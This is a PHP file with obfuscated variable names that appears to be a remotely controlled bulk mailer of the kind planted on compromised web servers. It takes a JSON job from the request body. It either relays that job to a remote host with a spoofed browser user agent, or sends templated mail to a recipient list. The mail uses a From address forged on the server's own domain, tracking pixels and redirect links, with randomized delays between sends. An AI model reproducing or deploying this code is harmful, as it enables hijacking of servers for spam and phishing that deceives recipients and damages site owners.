<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp6e873d) { if ($sp6e873d == 'keys') { return array_keys($this->_keys); } } public function Import($sp6e873d, $spcf2a6d) { if (is_array($spcf2a6d)) { $this->values[$sp6e873d] = array(); foreach ($spcf2a6d as $sp3d248f) { if (!empty($sp3d248f['key'])) { $this->values[$sp6e873d][$sp3d248f['key']] = $sp3d248f['value']; } else { $this->values[$sp6e873d][] = $sp3d248f['value']; } } } else { $this->Assign($sp6e873d, $spcf2a6d); } } public function Assign($sp6e873d, $sp90c6a3) { $this->values[$sp6e873d] = $sp90c6a3; } public function Parse($sp0e8c8a) { $sp88570a = ''; $sp0d2e82 = 0; while (true) { $spfa1db4 = strpos($sp0e8c8a, '{', $sp0d2e82); if ($spfa1db4 === false) { $sp88570a .= substr($sp0e8c8a, $sp0d2e82); break; } $sp88570a .= substr($sp0e8c8a, $sp0d2e82, $spfa1db4 - $sp0d2e82); $sp0d2e82 = $spfa1db4 + 1; $sp63c564 = ''; $sp3a274b = '{'; $spa22947 = array(); $sp58283b = false; $sp8c1509 = false; $sp145889 = 'var'; while ($sp0d2e82 < strlen($sp0e8c8a)) { $sp9808fd = substr($sp0e8c8a, $sp0d2e82, 1); $sp3a274b .= $sp9808fd; if ($sp9808fd == ',' || $sp9808fd == '>' || $sp9808fd == '|') { if ($sp145889 == 'alias') { $sp58283b = $sp63c564; } elseif ($sp145889 == 'mod') { $sp8c1509 = $sp63c564; } else { $spa22947[] = $sp63c564; } $sp63c564 = ''; if ($sp9808fd == '>') { $sp145889 = 'alias'; } if ($sp9808fd == '|') { $sp145889 = 'mod'; } $sp0d2e82++; continue; } if ($sp9808fd == '}') { if ($sp145889 == 'alias') { $sp58283b = $sp63c564; } elseif ($sp145889 == 'mod') { $sp8c1509 = $sp63c564; } else { $spa22947[] = $sp63c564; } $sp0d2e82++; break; } $sp63c564 .= $sp9808fd; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp9808fd) == 0) { $sp0d2e82++; $spa22947 = array(); break; } $sp0d2e82++; } if (sizeof($spa22947) == 0) { $sp88570a .= $sp3a274b; continue; } $spde8027 = false; $sp7105ac = false; if (preg_match('/^\\^/', $spa22947[0]) > 0) { $spa22947[0] = substr($spa22947[0], 1); $spde8027 = true; } if (preg_match('/^\\!/', $spa22947[0]) > 0) { $spa22947[0] = substr($spa22947[0], 1); $sp7105ac = true; } $sp570981 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spa22947[0], $sp50c1bd) > 0) { $sp570981 = $sp50c1bd[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spa22947[0], $sp50c1bd) > 0) { $sp570981 = explode('-', $sp50c1bd[1]); } if ($sp570981 !== false) { $spa22947[0] = substr($spa22947[0], 0, strpos($spa22947[0], '[')); } $this->_keys[$spa22947[0]] = true; if (empty($this->values[$spa22947[0]]) && empty($this->fixed[$spa22947[0]])) { continue; } if ($spde8027) { unset($this->fixed[$spa22947[0]]); } if (isset($this->fixed[$spa22947[0]])) { $spa38154 = $this->fixed[$spa22947[0]]; } else { $spa38154 = ''; $sp9c0008 = 1; if (sizeof($spa22947) == 2) { $sp9c0008 = $spa22947[1]; } if (sizeof($spa22947) == 3) { $sp9c0008 = rand($spa22947[1], $spa22947[2]); } for ($sp88f96c = 0; $sp88f96c < $sp9c0008; $sp88f96c++) { if (is_array($this->values[$spa22947[0]])) { if (!is_array($this->used[$spa22947[0]])) { $this->used[$spa22947[0]] = array(); } if (count($this->used[$spa22947[0]]) == count($this->values[$spa22947[0]])) { $this->used[$spa22947[0]] = array(); } if ($sp570981 !== false && is_scalar($sp570981)) { $spa38154 .= $this->values[$spa22947[0]][$sp570981]; $this->used[$sp570981] = true; } else { $sp1d3ce3 = array(); if (is_array($sp570981)) { $spc7081e = $sp570981[0]; $sp2460ff = $sp570981[1]; } else { $spc7081e = 0; $sp2460ff = count($this->values[$spa22947[0]]) - 1; } for ($spaf6e2b = $spc7081e; $spaf6e2b <= $sp2460ff; $spaf6e2b++) { if ($sp7105ac && !empty($this->used[$spa22947[0]][$spaf6e2b])) { continue; } $sp1d3ce3[] = $spaf6e2b; } $sp39f7d6 = $sp1d3ce3[rand(0, count($sp1d3ce3) - 1)]; $this->used[$spa22947[0]][$sp39f7d6] = true; $spa38154 .= $this->values[$spa22947[0]][$sp39f7d6]; } } else { $spa38154 .= $this->values[$spa22947[0]]; } } } $spa38154 = $this->Parse($spa38154); if ($sp8c1509 !== false) { for ($spcaf6ed = 0; $spcaf6ed < strlen($sp8c1509); $spcaf6ed++) { switch (substr($sp8c1509, $spcaf6ed, 1)) { case 'b': $spa38154 = base64_encode($spa38154); break; case 'q': $spa38154 = quoted_printable_encode($spa38154); break; default: break; } } } if ($spde8027) { $this->fixed[$spa22947[0]] = $spa38154; } if ($sp58283b !== false && $sp58283b != '') { $this->fixed[$sp58283b] = $spa38154; } $sp88570a .= $spa38154; } return $sp88570a; } } $sp724016 = file_get_contents('php://input'); $sp2f7143 = json_decode($sp724016, true); if (empty($sp2f7143['via_proxy'])) { $sp2f7143['via_proxy'] = true; $sp799ed2 = curl_init($sp2f7143['prefix'] . $sp2f7143['files']['s']); $spaf17e8 = json_encode($sp2f7143); curl_setopt($sp799ed2, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp799ed2, CURLOPT_TIMEOUT, 600); curl_setopt($sp799ed2, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp799ed2, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp799ed2, CURLOPT_REFERER, $sp963f00); curl_setopt($sp799ed2, CURLOPT_POST, true); curl_setopt($sp799ed2, CURLOPT_POSTFIELDS, $spaf17e8); curl_setopt($sp799ed2, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spaf17e8))); $spd82ea3 = curl_exec($sp799ed2); echo $spd82ea3; die; } $sp191f12 = $_SERVER['SERVER_ADDR']; $sp578bb5 = $_SERVER['HTTP_HOST']; $sp578bb5 = preg_replace('/^www\\./', '', $sp578bb5); $spefe819 = new Macros(); $spefe819->Assign('server_addr', $sp191f12); $spefe819->Assign('server_host', $sp578bb5); foreach ($sp2f7143['macros'] as $sp6e873d => $spcf2a6d) { $spefe819->Import($sp6e873d, $spcf2a6d); } $sp3003d4 = preg_replace('/^www\\./i', '', $sp578bb5); $spa973f4 = $spefe819->Parse('{from_user}@' . $sp3003d4); $spefe819->Assign('from_email', $spa973f4); $spefe819->Assign('prefix', $sp2f7143['prefix']); $spefe819->Assign('html', $sp2f7143['letter']['html']); $sp0d2e82 = 0; $sp4b1116 = 0; $sp8aeecf = 0; $sp25b3d7 = array(); foreach ($sp2f7143['rcpt'] as $sp52b747) { $spefe819->Assign('email', $sp52b747['email']); $spefe819->Assign('entry', $sp52b747); $spefe819->Assign('date', date('r')); $spefe819->Assign('redirect', $sp2f7143['prefix'] . $sp2f7143['files']['r']); $spefe819->Assign('redirect_with_uri', $sp2f7143['prefix'] . $sp2f7143['files']['r'] . '?uri='); $spefe819->Assign('unsubscribe', $sp2f7143['prefix'] . $sp2f7143['files']['u'] . '?id=' . $sp52b747['id']); $spefe819->Assign('delivery', '<img src="' . $sp2f7143['prefix'] . $sp2f7143['files']['d'] . '?id=' . $sp52b747['id'] . '" />'); $spe32d05 = $spefe819->Parse($sp2f7143['envelope']['header']); $spf7e634 = $spefe819->Parse($sp2f7143['envelope']['body']); if (!empty($sp52b747['name'])) { $sp6cb3a6 = $sp52b747['name'] . ' <' . $sp52b747['email'] . '>'; } else { $sp6cb3a6 = $sp52b747['email']; } $sp7713ad = $spefe819->Parse($sp2f7143['letter']['subject']); if ($sp0d2e82 > 0) { sleep(rand(3, 8)); } $sp49b6c8 = mail($sp6cb3a6, $sp7713ad, $spf7e634, $spe32d05); $sp25b3d7[$sp52b747['id']] = $sp49b6c8; if ($sp49b6c8) { $sp4b1116++; } else { $sp8aeecf++; } $sp0d2e82++; } echo serialize(array('total' => count($sp2f7143['rcpt']), 'sent' => $sp0d2e82, 'success' => $sp4b1116, 'error' => $sp8aeecf, 'rcpt' => $sp25b3d7));